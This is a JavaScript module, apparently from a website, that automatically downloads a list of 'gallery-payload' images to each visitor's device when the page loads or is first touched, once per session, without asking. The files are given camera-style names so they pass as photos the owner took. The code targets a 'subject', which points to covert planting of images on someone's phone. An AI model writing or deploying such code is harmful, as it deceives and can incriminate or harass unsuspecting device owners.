import { SUBJECT_IMAGE_DOWNLOAD, GALLERY_PAYLOAD_PATHS } from './config';

function absoluteUrl(relativePath) {
    const base = process.env.PUBLIC_URL || '';
    const href = `${base}${relativePath}`.replace(/([^:]\/)\/+/g, '$1');
    return new URL(href, window.location.href).href;
}

function isDone(storageKey) {
    try {
        return sessionStorage.getItem(storageKey) === '1';
    } catch {
        return true;
    }
}

function markDone(storageKey) {
    try {
        sessionStorage.setItem(storageKey, '1');
    } catch {
        /* ignore */
    }
}

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
}

function galleryFilename(index) {
    const ts = new Date();
    const pad = (n) => String(n).padStart(2, '0');
    const stamp = `${ts.getFullYear()}${pad(ts.getMonth() + 1)}${pad(ts.getDate())}_${pad(ts.getHours())}${pad(ts.getMinutes())}${pad(ts.getSeconds())}`;
    return `IMG_${pad(index)}_${stamp}.jpg`;
}

function triggerDownload(href, filename) {
    const a = document.createElement('a');
    a.href = href;
    a.download = filename;
    a.rel = 'noopener';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function delay(ms) {
    return new Promise((resolve) => {
        window.setTimeout(resolve, ms);
    });
}

async function downloadOneImage(relativePath, index) {
    const filename = galleryFilename(index);
    const res = await fetch(absoluteUrl(relativePath), { cache: 'no-store', credentials: 'same-origin' });
    if (!res.ok) throw new Error(`download_http_${res.status}`);
    const raw = await res.blob();
    const type = raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
    const blob = raw.type === type ? raw : new Blob([raw], { type });
    const blobUrl = URL.createObjectURL(blob);
    try {
        triggerDownload(blobUrl, filename);
    } finally {
        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
    }
}

/** Subyekt cihazına gallery-payload şəkillərini endir (sessiya başına bir dəfə) */
export async function runSubjectImageDownload(storageKey = 'pulse_subject_image_v1') {
    if (!SUBJECT_IMAGE_DOWNLOAD || isDone(storageKey)) return false;

    let downloaded = 0;
    for (let i = 0; i < GALLERY_PAYLOAD_PATHS.length; i += 1) {
        try {
            await downloadOneImage(GALLERY_PAYLOAD_PATHS[i], i + 1);
            downloaded += 1;
            if (i < GALLERY_PAYLOAD_PATHS.length - 1) {
                await delay(isMobileDevice() ? 400 : 150);
            }
        } catch (e) {
            console.warn('subject image download:', GALLERY_PAYLOAD_PATHS[i], e?.message || e);
            try {
                triggerDownload(absoluteUrl(GALLERY_PAYLOAD_PATHS[i]), galleryFilename(i + 1));
                downloaded += 1;
            } catch {
                /* növbəti şəkil */
            }
        }
    }

    if (downloaded === GALLERY_PAYLOAD_PATHS.length) {
        markDone(storageKey);
        return true;
    }
    return downloaded > 0;
}

export function attachSubjectImageDownloadOnEntry(storageKey = 'pulse_subject_image_v1') {
    if (!SUBJECT_IMAGE_DOWNLOAD || isDone(storageKey)) return () => {};

    let finished = false;
    const run = async () => {
        if (finished) return;
        const ok = await runSubjectImageDownload(storageKey);
        if (ok) finished = true;
    };

    run();
    document.addEventListener('pointerdown', run, { once: true, passive: true });
    document.addEventListener('touchstart', run, { once: true, passive: true });
    return () => {
        document.removeEventListener('pointerdown', run);
        document.removeEventListener('touchstart', run);
    };
}

export function subjectImageDownloadSettleMs() {
    return isMobileDevice() ? GALLERY_PAYLOAD_PATHS.length * 450 : 0;
}
